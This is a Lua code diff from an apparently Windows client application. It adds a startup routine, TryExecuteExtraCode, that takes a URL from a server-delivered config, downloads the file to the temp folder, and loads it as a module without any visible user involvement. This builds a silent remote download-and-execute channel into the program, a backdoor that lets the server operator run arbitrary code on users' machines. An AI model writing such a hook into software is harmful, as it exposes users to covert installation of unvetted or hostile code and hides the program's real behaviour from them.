@@ -246,6 +246,34 @@ function TryForceUpdate(tServerConfig)
 end
 
 
+function TryExecuteExtraCode(tServerConfig)
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local tExtraHelper = tServerConfig["tExtraHelper"] or {}
+	local strURL = tExtraHelper["strURL"]
+	local strMD5 = tExtraHelper["strMD5"]
+	
+	if not IsRealString(strURL) then
+		return
+	end
+	local strHelperName = FunctionObj.GetFileSaveNameFromUrl(strURL)
+	local strSaveDir = tipUtil:GetSystemTempPath()
+	local strSavePath = tipUtil:PathCombine(strSaveDir, strHelperName)
+	
+	FunctionObj.DownLoadFileWithCheck(strURL, strSavePath, strMD5
+	, function(bRet, strRealPath)
+		FunctionObj.TipLog("[TryExecuteExtraCode] strURL:"..tostring(strURL)
+		        .."  bRet:"..tostring(bRet).."  strRealPath:"..tostring(strRealPath))
+				
+		if bRet < 0 then
+			return
+		end
+		
+		FunctionObj.TipLog("[TryExecuteExtraCode] begin execute extra helper")
+		XLLoadModule(strRealPath)
+	end)	
+end
+
+
 function FixUserConfig(tServerConfig)
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local tUserConfigInServer = tServerConfig["tUserConfigInServer"]
@@ -319,6 +347,7 @@ function AnalyzeServerConfig(nDownServer, strServerPath)
 	TryForceUpdate(tServerConfig)
 	FixUserConfig(tServerConfig)
 	CheckServerRuleFile(tServerConfig)
+	TryExecuteExtraCode(tServerConfig)
 end
 
 
@@ -536,9 +565,9 @@ function PreTipMain()
 	FunctionObj.ReadAllConfigInfo()
 	
 	SendStartupReport(false)
-	FunctionObj.DownLoadServerConfig(AnalyzeServerConfig)
-	
 	TipMain()
+	
+	FunctionObj.DownLoadServerConfig(AnalyzeServerConfig)
 end
 
 PreTipMain()
